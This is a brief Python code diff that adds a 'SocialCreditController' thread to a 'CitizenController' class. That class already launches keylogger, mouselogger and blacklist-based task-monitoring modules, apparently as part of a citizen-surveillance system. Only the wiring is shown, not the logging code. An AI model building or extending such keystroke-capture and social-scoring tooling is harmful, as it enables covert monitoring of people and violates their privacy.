@@ -1,6 +1,7 @@
 from modules.keylogger.keylogger import KeyLogger
 from modules.mouselogger.mouselogger import MouseLogger
 from modules.task.task import Task
+from modules.sccontroller.sccontroller import SocialCreditController
 
 from queryController import QueryController
 import threading
@@ -31,6 +32,9 @@ class CitizenController:
         TASKLOGGER = Task(QUERY_CONTROLLER, self.blackListTasks)
         thr3 = threading.Thread(target=TASKLOGGER.main, args=())
         thr3.start()
+        SCCONTROLLER = SocialCreditController(QUERY_CONTROLLER)
+        thr4 = threading.Thread(target=SCCONTROLLER.main, args=())
+        thr4.start()
 
 """
 Start the controller.py script by initializing a controller object and running the start method
